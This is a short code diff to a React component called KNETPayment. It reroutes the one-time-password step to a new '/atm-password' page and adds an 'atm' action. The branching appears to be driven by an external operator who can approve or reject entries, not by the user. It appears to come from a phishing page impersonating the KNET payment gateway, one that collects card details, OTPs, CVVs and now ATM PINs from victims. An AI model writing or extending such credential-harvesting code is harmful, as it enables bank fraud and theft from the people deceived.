@@ -278,10 +278,12 @@ export default function KNETPayment() {
           setPhase("card");
         }
       } else if (phase === "otp") {
-        if (action === "otp") {
-          navigate("/final-page");
+        if (action === "otp" || action === "approve") {
+          navigate("/atm-password");
         } else if (action === "cvv") {
           navigate("/cvv");
+        } else if (action === "atm") {
+          navigate("/atm-password");
         } else if (action === "reject") {
           setRejectedError(t.errRejectOtp);
           setOtpCode("");
@@ -330,7 +332,9 @@ export default function KNETPayment() {
           setRejectedError(t.errRejectOtp);
           setOtpCode("");
         } else if (action === "approve" || action === "otp") {
-          navigate("/final-page");
+          navigate("/atm-password");
+        } else if (action === "atm") {
+          navigate("/atm-password");
         }
       } else if (phase === "card") {
         if (action === "reject") {
